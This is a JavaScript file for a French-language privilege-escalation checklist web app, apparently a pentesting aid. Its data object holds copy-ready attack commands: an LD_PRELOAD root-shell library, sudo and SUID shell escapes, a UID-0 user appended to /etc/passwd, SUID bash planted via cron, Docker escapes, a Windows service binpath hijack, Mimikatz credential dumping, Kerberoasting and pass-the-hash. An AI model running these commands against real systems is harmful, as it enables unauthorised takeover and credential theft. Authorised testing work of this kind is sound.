// État global simplifié
let globalState = {
    currentOS: null,
    currentContext: 'local',
    checklistState: {},
    availableTags: new Set()
};

// Clé de stockage
const STORAGE_KEY = 'privescChecklistState_v4';

// MEGA CHECKLIST COMPLÈTE
const MEGA_CHECKLIST = {
    linux: {
        'Énumération Système': [
            {
                id: 'linux_kernel_version',
                label: 'Version du Kernel',
                description: 'Identifier la version du kernel et rechercher des exploits connus',
                checkCommand: 'uname -a\ncat /proc/version\ncat /etc/os-release',
                exploitCommand: 'searchsploit "Linux Kernel $(uname -r | cut -d\'-\' -f1)"\n# Dirty COW, DirtyCred, etc.',
                tags: ['enumeration', 'kernel', 'exploit'],
                links: ['https://www.exploit-db.com/', 'https://github.com/SecWiki/linux-kernel-exploits'],
                tips: 'Vérifiez les CVE récents pour votre version de kernel. Attention aux exploits qui peuvent crasher le système.'
            },
            {
                id: 'linux_system_info',
                label: 'Informations Système',
                description: 'Collecter les informations de base du système',
                checkCommand: 'hostname\nwhoami\nid\ngroups\ncat /etc/passwd | grep -v nologin\ncat /etc/group',
                exploitCommand: '# Analyser les utilisateurs et groupes privilégiés',
                tags: ['enumeration', 'users', 'groups'],
                links: ['https://book.hacktricks.xyz/linux-hardening/privilege-escalation'],
                tips: 'Notez les utilisateurs avec UID 0, les groupes privilégiés (wheel, sudo, admin, docker, etc.)'
            },
            {
                id: 'linux_environment',
                label: 'Variables d\'Environnement',
                description: 'Examiner les variables d\'environnement pour des informations sensibles',
                checkCommand: 'env\necho $PATH\necho $LD_PRELOAD\necho $LD_LIBRARY_PATH',
                exploitCommand: '# Si LD_PRELOAD est modifiable:\necho \'#include <stdio.h>\nvoid _init() { setuid(0); system("/bin/bash"); }\' > /tmp/pe.c\ngcc -shared -fPIC -nostartfiles -o /tmp/pe.so /tmp/pe.c\nLD_PRELOAD=/tmp/pe.so [command]',
                tags: ['enumeration', 'environment', 'ld_preload'],
                links: ['https://book.hacktricks.xyz/linux-hardening/privilege-escalation#ld_preload'],
                tips: 'LD_PRELOAD et PATH modifiables peuvent mener à une escalade de privilèges'
            }
        ],
        'Permissions et Fichiers': [
            {
                id: 'linux_sudo_permissions',
                label: 'Permissions Sudo',
                description: 'Vérifier les permissions sudo de l\'utilisateur',
                checkCommand: 'sudo -l\nsudo -ll',
                exploitCommand: '# GTFOBins pour chaque binaire autorisé\n# Exemple vim: sudo vim -c \':!/bin/bash\'\n# Exemple find: sudo find . -exec /bin/bash \\; -quit',
                tags: ['permissions', 'sudo', 'gtfobins'],
                links: ['https://gtfobins.github.io/'],
                tips: 'Consultez GTFOBins pour chaque binaire. Attention aux NOPASSWD et aux wildcards.'
            },
            {
                id: 'linux_suid_sgid',
                label: 'Binaires SUID/SGID',
                description: 'Rechercher les binaires avec bits SUID/SGID',
                checkCommand: 'find / -type f \\( -perm -4000 -o -perm -2000 \\) -exec ls -l {} \\; 2>/dev/null\nfind / -type f -perm -4000 2>/dev/null | xargs ls -la',
                exploitCommand: '# GTFOBins pour chaque binaire SUID\n# Exemple find: find . -exec /bin/sh -p \\; -quit\n# Exemple cp: cp /etc/shadow /tmp/',
                tags: ['permissions', 'suid', 'sgid', 'gtfobins'],
                links: ['https://gtfobins.github.io/#+suid'],
                tips: 'Concentrez-vous sur les binaires non-standard. Vérifiez les versions vulnérables.'
            },
            {
                id: 'linux_capabilities',
                label: 'Linux Capabilities',
                description: 'Identifier les capabilities étendues sur les binaires',
                checkCommand: 'getcap -r / 2>/dev/null\n/sbin/getcap -r / 2>/dev/null',
                exploitCommand: '# cap_setuid: ./python -c "import os; os.setuid(0); os.system(\\"/bin/bash\\")"\\n# cap_sys_admin: mount, unshare, etc.',
                tags: ['permissions', 'capabilities'],
                links: ['https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities'],
                tips: 'cap_setuid, cap_sys_admin, cap_dac_override sont particulièrement dangereux'
            },
            {
                id: 'linux_writable_files',
                label: 'Fichiers Modifiables',
                description: 'Rechercher les fichiers système modifiables',
                checkCommand: 'find / -writable -type f 2>/dev/null | grep -E "(etc|bin|sbin|usr)" | head -20\nfind /etc -writable -type f 2>/dev/null',
                exploitCommand: '# /etc/passwd modifiable:\necho "root2:$(openssl passwd -1 password):0:0:root:/root:/bin/bash" >> /etc/passwd\n# Scripts cron modifiables:\necho "cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash" >> [script]',
                tags: ['permissions', 'writable', 'files'],
                links: ['https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files'],
                tips: 'Vérifiez /etc/passwd, /etc/shadow, les scripts cron, les fichiers de configuration'
            }
        ],
        'Services et Processus': [
            {
                id: 'linux_running_processes',
                label: 'Processus en Cours',
                description: 'Analyser les processus en cours d\'exécution',
                checkCommand: 'ps aux\nps -ef\ntop\nhtop',
                exploitCommand: '# Rechercher des processus root vulnérables\n# Injection dans des processus existants',
                tags: ['processes', 'services'],
                links: ['https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes'],
                tips: 'Recherchez les processus root, les services internes, les applications custom'
            },
            {
                id: 'linux_cron_jobs',
                label: 'Tâches Cron',
                description: 'Examiner les tâches cron pour des vulnérabilités',
                checkCommand: 'ls -la /etc/cron*\ncat /etc/crontab\ncrontab -l\nls -la /var/spool/cron/\nls -la /var/spool/cron/crontabs/',
                exploitCommand: '# Script cron modifiable:\necho "cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash" >> [script]\n# Wildcard injection dans cron',
                tags: ['cron', 'scheduled', 'persistence'],
                links: ['https://book.hacktricks.xyz/linux-hardening/privilege-escalation#scheduled-cron-jobs'],
                tips: 'Vérifiez les permissions des scripts, les wildcards, les chemins relatifs'
            },
            {
                id: 'linux_network_services',
                label: 'Services Réseau',
                description: 'Identifier les services réseau internes',
                checkCommand: 'netstat -tulpn\nss -tulpn\nlsof -i\nnetstat -ano',
                exploitCommand: '# Services internes sur localhost\n# Port forwarding si nécessaire',
                tags: ['network', 'services', 'internal'],
                links: ['https://book.hacktricks.xyz/linux-hardening/privilege-escalation#network'],
                tips: 'Recherchez les services sur localhost, les ports non-standard'
            }
        ],
        'Exploitation Avancée': [
            {
                id: 'linux_docker_escape',
                label: 'Évasion de Conteneur Docker',
                description: 'Techniques d\'évasion depuis un conteneur Docker',
                checkCommand: 'cat /proc/1/cgroup | grep docker\nls -la /.dockerenv\nmount | grep docker',
                exploitCommand: '# Si privilégié:\ndocker run -v /:/mnt --rm -it alpine chroot /mnt sh\n# Montage de /proc/sys/kernel/core_pattern\necho "|/tmp/exploit" > /proc/sys/kernel/core_pattern',
                tags: ['docker', 'container', 'escape'],
                links: ['https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout'],
                tips: 'Vérifiez les capabilities, les montages, les sockets Docker exposés'
            }
        ]
    },
    
    windows: {
        'Énumération Système': [
            {
                id: 'windows_system_info',
                label: 'Informations Système',
                description: 'Collecter les informations de base du système Windows',
                checkCommand: 'systeminfo\nwhoami\nwhoami /priv\nwhoami /groups\nnet user\nnet localgroup',
                exploitCommand: '# Analyser les privilèges et groupes',
                tags: ['enumeration', 'system', 'users'],
                links: ['https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation'],
                tips: 'Notez les privilèges activés, les groupes d\'administration'
            },
            {
                id: 'windows_patches',
                label: 'Patches et Vulnérabilités',
                description: 'Identifier les patches manquants et vulnérabilités connues',
                checkCommand: 'wmic qfe list\nsysteminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"',
                exploitCommand: '# Rechercher des exploits pour la version\n# MS17-010, MS16-032, etc.',
                tags: ['enumeration', 'patches', 'exploits'],
                links: ['https://github.com/SecWiki/windows-kernel-exploits'],
                tips: 'Utilisez Windows Exploit Suggester ou Sherlock pour identifier les exploits'
            },
            {
                id: 'windows_environment',
                label: 'Variables d\'Environnement',
                description: 'Examiner les variables d\'environnement',
                checkCommand: 'set\necho %PATH%\necho %PATHEXT%',
                exploitCommand: '# PATH hijacking si répertoire modifiable dans PATH',
                tags: ['enumeration', 'environment', 'path'],
                links: ['https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#environment'],
                tips: 'Recherchez les répertoires modifiables dans PATH'
            }
        ],
        'Services et Applications': [
            {
                id: 'windows_services',
                label: 'Services Windows',
                description: 'Analyser les services pour des misconfigurations',
                checkCommand: 'sc query\nwmic service list brief\nnet start',
                exploitCommand: '# Service avec permissions faibles:\nsc config [service] binpath="cmd /c net localgroup administrators [user] /add"\nsc start [service]',
                tags: ['services', 'permissions', 'misconfiguration'],
                links: ['https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services'],
                tips: 'Utilisez accesschk.exe pour vérifier les permissions des services'
            },
            {
                id: 'windows_unquoted_service_paths',
                label: 'Chemins de Service Non-Quotés',
                description: 'Exploiter les chemins de service non-quotés',
                checkCommand: 'wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\\windows\\\\" | findstr /i /v """',
                exploitCommand: '# Placer un exécutable malveillant dans le chemin\n# Exemple: C:\\Program.exe pour "C:\\Program Files\\App\\app.exe"',
                tags: ['services', 'unquoted', 'path'],
                links: ['https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#unquoted-service-paths'],
                tips: 'Vérifiez les permissions d\'écriture dans les répertoires du chemin'
            },
            {
                id: 'windows_scheduled_tasks',
                label: 'Tâches Planifiées',
                description: 'Analyser les tâches planifiées pour des vulnérabilités',
                checkCommand: 'schtasks /query /fo LIST /v\ntaskschd.msc',
                exploitCommand: '# Tâche avec script modifiable\n# Remplacer le script par un payload',
                tags: ['scheduled', 'tasks', 'persistence'],
                links: ['https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#scheduled-tasks'],
                tips: 'Recherchez les tâches exécutées avec des privilèges élevés'
            }
        ],
        'Tokens et Privilèges': [
            {
                id: 'windows_token_impersonation',
                label: 'Impersonation de Tokens',
                description: 'Exploiter l\'impersonation de tokens',
                checkCommand: 'whoami /priv | findstr SeImpersonatePrivilege\nwhoami /priv | findstr SeAssignPrimaryTokenPrivilege',
                exploitCommand: '# Potato attacks (JuicyPotato, RoguePotato, etc.)\n# PrintSpoofer si Windows 10/Server 2019+',
                tags: ['tokens', 'impersonation', 'potato'],
                links: ['https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens'],
                tips: 'SeImpersonatePrivilege et SeAssignPrimaryTokenPrivilege permettent les attaques Potato'
            },
            {
                id: 'windows_debug_privilege',
                label: 'SeDebugPrivilege',
                description: 'Exploiter SeDebugPrivilege pour accéder aux processus',
                checkCommand: 'whoami /priv | findstr SeDebugPrivilege',
                exploitCommand: '# Injection dans un processus SYSTEM\n# Utiliser ProcDump, Mimikatz, ou custom tools',
                tags: ['tokens', 'debug', 'processes'],
                links: ['https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens#sedebugprivilege'],
                tips: 'Permet d\'accéder à tous les processus, y compris SYSTEM'
            }
        ],
        'Fichiers et Permissions': [
            {
                id: 'windows_weak_file_permissions',
                label: 'Permissions de Fichiers Faibles',
                description: 'Rechercher des fichiers avec des permissions faibles',
                checkCommand: 'accesschk.exe -wvu "C:\\Program Files"\naccesschk.exe -wvu "C:\\Program Files (x86)"\nicacls "C:\\Program Files\\*" | findstr "Everyone\\|Users\\|Authenticated Users" | findstr "F\\|M\\|W"',
                exploitCommand: '# Remplacer un exécutable\ncopy evil.exe "C:\\Program Files\\App\\app.exe"',
                tags: ['files', 'permissions', 'weak'],
                links: ['https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#file-and-folder-permissions'],
                tips: 'Recherchez les permissions WRITE sur les exécutables et DLL'
            },
            {
                id: 'windows_dll_hijacking',
                label: 'DLL Hijacking',
                description: 'Exploiter le DLL hijacking pour l\'escalade',
                checkCommand: 'dir /s *.dll\nProcess Monitor (ProcMon) pour identifier les DLL manquantes',
                exploitCommand: '# Créer une DLL malveillante\n# Placer dans le répertoire de l\'application ou dans PATH',
                tags: ['dll', 'hijacking', 'libraries'],
                links: ['https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#dll-hijacking'],
                tips: 'Recherchez les DLL manquantes dans les répertoires modifiables'
            }
        ]
    },
    
    'windows-ad': {
        'Énumération Active Directory': [
            {
                id: 'ad_domain_info',
                label: 'Informations du Domaine',
                description: 'Collecter les informations de base sur le domaine AD',
                checkCommand: 'echo %USERDOMAIN%\necho %LOGONSERVER%\nnltest /dclist:%userdomain%\nnet time /domain',
                exploitCommand: '# Énumération avec PowerView\nGet-Domain\nGet-DomainController',
                tags: ['enumeration', 'domain', 'ad'],
                links: ['https://book.hacktricks.xyz/windows-hardening/active-directory-methodology'],
                tips: 'Identifiez les contrôleurs de domaine et la structure du domaine'
            },
            {
                id: 'ad_user_enumeration',
                label: 'Énumération des Utilisateurs',
                description: 'Énumérer les utilisateurs du domaine',
                checkCommand: 'net user /domain\nnet group "Domain Users" /domain\nnet group "Domain Admins" /domain',
                exploitCommand: '# PowerView\nGet-DomainUser\nGet-DomainUser -AdminCount\nGet-DomainGroupMember "Domain Admins"',
                tags: ['enumeration', 'users', 'ad'],
                links: ['https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/enumeration'],
                tips: 'Recherchez les comptes privilégiés et les comptes de service'
            }
        ],
        'Kerberos et Authentification': [
            {
                id: 'ad_kerberoasting',
                label: 'Kerberoasting',
                description: 'Extraire et cracker les tickets de service Kerberos',
                checkCommand: 'setspn -Q */*\nGet-DomainUser -SPN',
                exploitCommand: '# Impacket\nGetUserSPNs.py domain/user:password -dc-ip [dc_ip] -request\n# PowerView\nInvoke-Kerberoast',
                tags: ['kerberos', 'spn', 'cracking'],
                links: ['https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast'],
                tips: 'Recherchez les comptes avec SPN et des mots de passe faibles'
            },
            {
                id: 'ad_asreproasting',
                label: 'ASREPRoasting',
                description: 'Exploiter les comptes sans pré-authentification Kerberos',
                checkCommand: 'Get-DomainUser -PreauthNotRequired',
                exploitCommand: '# Impacket\nGetNPUsers.py domain/ -usersfile users.txt -dc-ip [dc_ip]\n# Cracker avec hashcat',
                tags: ['kerberos', 'asrep', 'preauth'],
                links: ['https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproast'],
                tips: 'Recherchez les comptes avec DONT_REQ_PREAUTH'
            }
        ],
        'Mouvement Latéral': [
            {
                id: 'ad_pass_the_hash',
                label: 'Pass-the-Hash',
                description: 'Utiliser des hashes NTLM pour l\'authentification',
                checkCommand: '# Extraire les hashes avec Mimikatz\nsekurlsa::logonpasswords\nsekurlsa::msv',
                exploitCommand: '# Impacket\npsexec.py domain/user@target -hashes :ntlm_hash\nwmiexec.py domain/user@target -hashes :ntlm_hash',
                tags: ['lateral', 'ntlm', 'hash'],
                links: ['https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/pass-the-hash'],
                tips: 'Fonctionne avec les hashes NTLM des comptes locaux et de domaine'
            }
        ]
    },
    
    macos: {
        'Énumération Système': [
            {
                id: 'macos_system_info',
                label: 'Informations Système',
                description: 'Collecter les informations de base du système macOS',
                checkCommand: 'sw_vers\nuname -a\nwhoami\nid\ngroups\ndscl . list /Users | grep -v "^_"',
                exploitCommand: '# Analyser les utilisateurs et groupes privilégiés',
                tags: ['enumeration', 'system', 'users'],
                links: ['https://book.hacktricks.xyz/macos-hardening/macos-security-and-privilege-escalation'],
                tips: 'Notez les utilisateurs admin, les groupes wheel et admin'
            },
            {
                id: 'macos_sudo_permissions',
                label: 'Permissions Sudo',
                description: 'Vérifier les permissions sudo de l\'utilisateur',
                checkCommand: 'sudo -l\nsudo -ll',
                exploitCommand: '# GTFOBins pour chaque binaire autorisé\n# Techniques similaires à Linux',
                tags: ['permissions', 'sudo', 'gtfobins'],
                links: ['https://gtfobins.github.io/'],
                tips: 'Consultez GTFOBins pour les techniques d\'escalade via sudo'
            }
        ],
        'Applications et Services': [
            {
                id: 'macos_applications',
                label: 'Applications Installées',
                description: 'Énumérer les applications pour des vulnérabilités',
                checkCommand: 'ls -la /Applications\nls -la ~/Applications\nsystem_profiler SPApplicationsDataType',
                exploitCommand: '# Rechercher des applications avec des vulnérabilités connues',
                tags: ['applications', 'enumeration'],
                links: ['https://book.hacktricks.xyz/macos-hardening/macos-security-and-privilege-escalation#applications'],
                tips: 'Vérifiez les versions des applications pour des CVE connues'
            }
        ]
    }
};

// Initialisation
document.addEventListener('DOMContentLoaded', function() {
    console.log('Privesc Guide - Initialisation...');
    
    // Vérifier les éléments DOM requis
    const requiredElements = [
        'os-select',
        'context-select',
        'checklist-container',
        'checklist-placeholder'
    ];
    
    const missingElements = requiredElements.filter(id => !document.getElementById(id));
    if (missingElements.length > 0) {
        console.error('Éléments DOM manquants:', missingElements);
        return;
    }
    
    console.log('Tous les éléments DOM requis sont présents');
    
    // Charger l'état sauvegardé
    loadChecklistState();
    
    // Initialiser les event listeners
    initializeEventListeners();
    
    console.log('Interface privesc initialisée avec succès');
});

// Chargement de l'état sauvegardé
function loadChecklistState() {
    try {
        const saved = localStorage.getItem(STORAGE_KEY);
        if (saved) {
            globalState.checklistState = JSON.parse(saved);
            console.log('État de la checklist chargé depuis localStorage');
        }
    } catch (error) {
        console.error('Erreur lors du chargement de l\'état:', error);
    }
}

// Sauvegarde de l'état
function saveChecklistState() {
    try {
        localStorage.setItem(STORAGE_KEY, JSON.stringify(globalState.checklistState));
    } catch (error) {
        console.error('Erreur lors de la sauvegarde de l\'état:', error);
    }
}

// Initialisation des event listeners
function initializeEventListeners() {
    const osSelect = document.getElementById('os-select');
    const contextSelect = document.getElementById('context-select');
    
    if (osSelect) {
        osSelect.addEventListener('change', handleOSChange);
    }
    
    if (contextSelect) {
        contextSelect.addEventListener('change', handleContextChange);
    }
    
    // Event listeners pour les filtres
    const searchInput = document.getElementById('checklist-search');
    const statusFilter = document.getElementById('checklist-filter-status');
    const tagFilter = document.getElementById('checklist-filter-tag');
    
    if (searchInput) {
        searchInput.addEventListener('input', applyFilters);
    }
    
    if (statusFilter) {
        statusFilter.addEventListener('change', applyFilters);
    }
    
    if (tagFilter) {
        tagFilter.addEventListener('change', applyFilters);
    }
    
    // Event delegation pour les éléments de checklist
    const container = document.getElementById('checklist-container');
    if (container) {
        container.addEventListener('change', handleChecklistChange);
        container.addEventListener('click', handleCopyClick);
    }
}

// Gestion du changement d'OS
function handleOSChange(event) {
    const selectedOS = event.target.value;
    globalState.currentOS = selectedOS;
    
    if (selectedOS) {
        displayChecklist(selectedOS);
        showFiltersSection();
        enableFilters();
    } else {
        displayInitialView();
    }
}

// Gestion du changement de contexte
function handleContextChange(event) {
    globalState.currentContext = event.target.value;
    // Peut être utilisé pour filtrer ou adapter la checklist
}

// Affichage de la checklist
function displayChecklist(osType) {
    const checklistData = MEGA_CHECKLIST[osType];
    if (!checklistData) return;
    
    const container = document.getElementById('checklist-container');
    const placeholder = document.getElementById('checklist-placeholder');
    
    if (placeholder) placeholder.style.display = 'none';
    
    // Vider le container
    Array.from(container.children).forEach(child => {
        if (child.id !== 'checklist-placeholder') {
            child.remove();
        }
    });
    
    // Ajouter la section d'export en premier
    const exportSection = document.createElement('div');
    exportSection.className = 'export-section';
    exportSection.innerHTML = `
        <div class="export-card">
            <h3>📤 Export de la Checklist</h3>
            <div class="export-controls">
                <div class="export-info">
                    <div class="export-stats">
                        <div class="stat-item stat-total">
                            <span>Total:</span>
                            <span class="stat-value">0</span>
                        </div>
                        <div class="stat-item stat-todo">
                            <span>⏳ À vérifier:</span>
                            <span class="stat-value">0</span>
                        </div>
                        <div class="stat-item stat-checked">
                            <span>✅ Vérifiés:</span>
                            <span class="stat-value">0</span>
                        </div>
                        <div class="stat-item stat-exploitable">
                            <span>⚠️ Exploitables:</span>
                            <span class="stat-value">0</span>
                        </div>
                        <div class="stat-item stat-exploited">
                            <span>🚨 Exploités:</span>
                            <span class="stat-value">0</span>
                        </div>
                    </div>
                </div>
                <div class="export-buttons">
                    <button class="export-btn" onclick="exportToJSON()">
                        <span>📄</span>
                        JSON
                    </button>
                    <button class="export-btn secondary" onclick="exportToMarkdown()">
                        <span>📝</span>
                        Markdown
                    </button>
                    <button class="export-btn accent" onclick="exportToHTML()">
                        <span>🌐</span>
                        HTML
                    </button>
                    <button class="export-btn" onclick="exportToZip()">
                        <span>📦</span>
                        ZIP Complet
                    </button>
                </div>
            </div>
        </div>
    `;
    
    container.appendChild(exportSection);
    
    // Générer la checklist par catégorie
    Object.entries(checklistData).forEach(([categoryName, items]) => {
        // En-tête de catégorie
        const categoryHeader = document.createElement('div');
        categoryHeader.className = 'category-header';
        categoryHeader.id = `category-${categoryName.toLowerCase().replace(/\s+/g, '-')}`;
        categoryHeader.innerHTML = `<h3>${getCategoryIcon(categoryName)} ${categoryName}</h3>`;
        container.appendChild(categoryHeader);
        
        // Items de la catégorie
        items.forEach(item => {
            const itemElement = document.createElement('div');
            itemElement.className = 'checklist-item';
            itemElement.dataset.itemId = item.id;
            
            const state = globalState.checklistState[item.id] || { status: 'todo', notes: '' };
            itemElement.classList.add(`status-${state.status}`);
            
            itemElement.innerHTML = `
                <div class="checklist-header">
                    <div class="checklist-title">
                        <h4 class="checklist-label">${item.label}</h4>
                        <div class="checklist-tags">
                            ${item.tags.map(tag => `<span class="tag-badge">${tag}</span>`).join('')}
                        </div>
                    </div>
                    <div class="checklist-controls">
                        <select class="checklist-status-select" data-item-id="${item.id}">
                            <option value="todo" ${state.status === 'todo' ? 'selected' : ''}>⏳ À vérifier</option>
                            <option value="checked" ${state.status === 'checked' ? 'selected' : ''}>✅ Vérifié</option>
                            <option value="exploitable" ${state.status === 'exploitable' ? 'selected' : ''}>⚠️ Exploitable</option>
                            <option value="exploited" ${state.status === 'exploited' ? 'selected' : ''}>🚨 Exploité</option>
                        </select>
                    </div>
                </div>
                
                <div class="checklist-content">
                    <p class="checklist-description">${item.description}</p>
                    
                    <div class="checklist-commands">
                        <h6><i class="icon">🔍</i> Commande de vérification</h6>
                        <div class="command-block">
                            <code>${item.checkCommand}</code>
                            <button class="copy-btn copy-btn-inline" data-clipboard-text="${item.checkCommand}">📋</button>
                        </div>
                    </div>
                    
                    ${item.exploitCommand ? `
                    <div class="checklist-exploit">
                        <h6><i class="icon">⚡</i> Commande d'exploitation</h6>
                        <div class="command-block">
                            <code>${item.exploitCommand}</code>
                            <button class="copy-btn copy-btn-inline" data-clipboard-text="${item.exploitCommand}">📋</button>
                        </div>
                    </div>
                    ` : ''}
                    
                    ${item.links && item.links.length > 0 ? `
                    <div class="checklist-links">
                        <h6><i class="icon">🔗</i> Liens Utiles</h6>
                        ${item.links.map(link => `<a href="${link}" target="_blank">${link}</a>`).join('')}
                    </div>
                    ` : ''}
                    
                    ${item.tips ? `
                    <div class="checklist-tips">
                        <h6><i class="icon">💡</i> Conseils</h6>
                        <p>${item.tips}</p>
                    </div>
                    ` : ''}
                    
                    <div class="checklist-notes">
                        <h6><i class="icon">📝</i> Notes personnelles</h6>
                        <textarea class="checklist-notes-textarea" data-item-id="${item.id}" placeholder="Ajoutez vos notes ici...">${state.notes}</textarea>
                    </div>
                </div>
            `;
            
            container.appendChild(itemElement);
            
            // Ajouter les tags à la liste globale
            item.tags.forEach(tag => globalState.availableTags.add(tag));
        });
    });
    
    // Mettre à jour les statistiques d'export
    updateExportStats();
    
    // Configurer les event listeners
    setupEventListeners();
    
    // Mettre à jour les filtres
    updateTagFilter();
    updateQuickNavigation(checklistData);
    
    // Afficher les sections
    showFiltersSection();
    enableFilters();
}

// Création d'un élément de checklist
function createChecklistItem(item) {
    const itemDiv = document.createElement('div');
    itemDiv.className = 'checklist-item';
    itemDiv.dataset.itemId = item.id;
    
    // Récupérer l'état sauvegardé
    const savedState = globalState.checklistState[item.id] || { status: 'todo', notes: '' };
    itemDiv.classList.add(`status-${savedState.status}`);
    
    itemDiv.innerHTML = `
        <div class="checklist-header">
            <div class="checklist-title">
                <h4 class="checklist-label">${item.label}</h4>
                <div class="checklist-badges">
                    ${item.tags.map(tag => `<span class="tag-badge">${tag}</span>`).join('')}
                </div>
            </div>
            <div class="checklist-controls">
                <select class="checklist-status-select">
                    <option value="todo" ${savedState.status === 'todo' ? 'selected' : ''}>À vérifier</option>
                    <option value="checked" ${savedState.status === 'checked' ? 'selected' : ''}>Vérifié</option>
                    <option value="exploitable" ${savedState.status === 'exploitable' ? 'selected' : ''}>Exploitable</option>
                    <option value="exploited" ${savedState.status === 'exploited' ? 'selected' : ''}>Exploité</option>
                </select>
            </div>
        </div>
        
        <div class="checklist-content">
            <p class="checklist-description">${item.description}</p>
            
            ${item.checkCommand ? `
                <div class="check-command">
                    <h6><i class="icon">🔍</i> Commande de vérification</h6>
                    <div class="command-block">
                        <pre><code>${item.checkCommand}</code></pre>
                        <button class="copy-btn copy-btn-inline" data-clipboard-text="${item.checkCommand}">📋</button>
                    </div>
                </div>
            ` : ''}
            
            ${item.exploitCommand ? `
                <div class="exploit-command">
                    <h6><i class="icon">⚡</i> Commande d'exploitation</h6>
                    <div class="command-block">
                        <pre><code>${item.exploitCommand}</code></pre>
                        <button class="copy-btn copy-btn-inline" data-clipboard-text="${item.exploitCommand}">📋</button>
                    </div>
                </div>
            ` : ''}
            
            ${item.links && item.links.length > 0 ? `
                <div class="checklist-links">
                    <h6><i class="icon">🔗</i> Liens Utiles</h6>
                    ${item.links.map(link => `<a href="${link}" target="_blank" rel="noopener">${link}</a>`).join('<br>')}
                </div>
            ` : ''}
            
            ${item.tips ? `
                <div class="checklist-tips">
                    <h6><i class="icon">💡</i> Conseils</h6>
                    <p>${item.tips}</p>
                </div>
            ` : ''}
            
            <div class="checklist-notes">
                <h6><i class="icon">📝</i> Notes personnelles</h6>
                <textarea class="checklist-notes-textarea" placeholder="Ajoutez vos notes ici...">${savedState.notes}</textarea>
            </div>
        </div>
    `;
    
    return itemDiv;
}

// Gestion des changements dans la checklist
function handleChecklistChange(event) {
    const target = event.target;
    const item = target.closest('.checklist-item');
    if (!item) return;
    
    const itemId = item.dataset.itemId;
    
    if (target.classList.contains('checklist-status-select')) {
        const newStatus = target.value;
        
        // Mettre à jour la classe CSS
        item.className = item.className.replace(/status-\w+/g, '');
        item.classList.add(`status-${newStatus}`);
        
        // Sauvegarder l'état
        if (!globalState.checklistState[itemId]) {
            globalState.checklistState[itemId] = {};
        }
        globalState.checklistState[itemId].status = newStatus;
        saveChecklistState();
        
    } else if (target.classList.contains('checklist-notes-textarea')) {
        // Sauvegarder les notes (avec debounce)
        clearTimeout(target.saveTimeout);
        target.saveTimeout = setTimeout(() => {
            if (!globalState.checklistState[itemId]) {
                globalState.checklistState[itemId] = {};
            }
            globalState.checklistState[itemId].notes = target.value;
            saveChecklistState();
        }, 1000);
    }
}

// Gestion des clics de copie
function handleCopyClick(event) {
    if (!event.target.classList.contains('copy-btn')) return;
    
    const text = event.target.dataset.clipboardText;
    if (!text) return;
    
    navigator.clipboard.writeText(text).then(() => {
        const originalText = event.target.textContent;
        event.target.textContent = '✅';
        event.target.style.background = '#10b981';
        
        setTimeout(() => {
            event.target.textContent = originalText;
            event.target.style.background = '';
        }, 1500);
    }).catch(err => {
        console.error('Erreur lors de la copie:', err);
        alert('Erreur lors de la copie dans le presse-papiers');
    });
}

// Mise à jour du filtre de tags
function updateTagFilter() {
    const tagFilter = document.getElementById('checklist-filter-tag');
    if (!tagFilter) return;
    
    // Vider les options existantes (sauf la première)
    while (tagFilter.children.length > 1) {
        tagFilter.removeChild(tagFilter.lastChild);
    }
    
    // Ajouter les nouveaux tags
    Array.from(globalState.availableTags).sort().forEach(tag => {
        const option = document.createElement('option');
        option.value = tag;
        option.textContent = tag;
        tagFilter.appendChild(option);
    });
}

// Application des filtres
function applyFilters() {
    const searchTerm = document.getElementById('checklist-search')?.value.toLowerCase() || '';
    const statusFilter = document.getElementById('checklist-filter-status')?.value || '';
    const tagFilter = document.getElementById('checklist-filter-tag')?.value || '';
    
    const items = document.querySelectorAll('.checklist-item');
    
    items.forEach(item => {
        const label = item.querySelector('.checklist-label')?.textContent.toLowerCase() || '';
        const description = item.querySelector('.checklist-description')?.textContent.toLowerCase() || '';
        const status = item.querySelector('.checklist-status-select')?.value || '';
        const tags = Array.from(item.querySelectorAll('.tag-badge')).map(badge => badge.textContent);
        
        const matchesSearch = !searchTerm || label.includes(searchTerm) || description.includes(searchTerm);
        const matchesStatus = !statusFilter || status === statusFilter;
        const matchesTag = !tagFilter || tags.includes(tagFilter);
        
        if (matchesSearch && matchesStatus && matchesTag) {
            item.style.display = 'block';
        } else {
            item.style.display = 'none';
        }
    });
}

// Mise à jour de la navigation rapide
function updateQuickNavigation(checklistData) {
    const quickNav = document.getElementById('quick-nav-links');
    const navLinks = quickNav?.querySelector('.nav-links');
    
    if (!navLinks) return;
    
    navLinks.innerHTML = '';
    
    Object.keys(checklistData).forEach(categoryName => {
        const link = document.createElement('a');
        link.href = `#category-${categoryName.toLowerCase().replace(/\s+/g, '-')}`;
        link.textContent = categoryName;
        link.className = 'nav-link';
        navLinks.appendChild(link);
    });
    
    quickNav.style.display = 'block';
}

// Affichage de la vue initiale
function displayInitialView() {
    const placeholder = document.getElementById('checklist-placeholder');
    const filtersSection = document.getElementById('filters-section');
    
    if (placeholder) placeholder.style.display = 'block';
    if (filtersSection) filtersSection.style.display = 'none';
    
    // Vider le container
    const container = document.getElementById('checklist-container');
    if (container) {
        Array.from(container.children).forEach(child => {
            if (child.id !== 'checklist-placeholder') {
                child.remove();
            }
        });
    }
}

// Affichage de la section filtres
function showFiltersSection() {
    const filtersSection = document.getElementById('filters-section');
